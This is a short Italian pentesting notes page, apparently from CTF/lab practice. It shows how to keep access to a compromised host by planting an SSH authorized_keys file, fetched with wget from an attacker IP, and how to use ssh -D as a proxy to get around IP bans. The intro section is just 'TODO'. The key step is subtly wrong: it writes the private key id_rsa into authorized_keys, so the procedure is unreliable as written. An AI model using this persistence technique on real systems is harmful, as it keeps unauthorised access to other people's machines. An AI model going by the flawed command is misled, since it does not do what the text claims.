### Cos'è SSH?
TODO

### Abuso delle chiavi SSH:
Quando si ottiene una shell remota su un dispositivo, è possibile rendere permanente la possibilità di accedere, anche in un altro momento, semplicemente utilizzando il protocollo SSH.

Dall'host remoto:

```
host-remoto@host:~/.ssh$ ssh-keygen
```

Dall'host locale:

```
host-locale@host:~/.ssh$ ssh-keygen
host-locale@host:~/.ssh$ cat id_rsa > authorized_keys
```

Trasportiamo in qualche modo (magari tramite protocollo HTTP oppure protocollo TCP) il file authorized_keys dall'host locale all'host remoto all'interno della directory ```.ssh```.

```
host-remoto@host:~/.ssh$ wget http://10.10.14.208:8000/authorized_keys
```

A questo punto dall'host locale dovremmo essere in grado di accedere all'host remoto in questo modo:

```
host-locale@host:~/.ssh$ ssh wizard@10.10.11.106
```


## Comandi fondamentali:

Mettere in ascolto una porta sulla macchina locale in modo tale da trasmettere il traffico generato su quella porta sul canale sicuro SSH affinchè la macchina remota possa rifare la nostra richiesta (ad un web server) per poi ottenere la risposta nuovamente sulla macchina locale. Questo è un esempio di proxy che potrebbe essere utile a bypassare eventuali BAN dell'ip della macchina.

```bash
ssh -D1080 <hostname>@<ip>
```
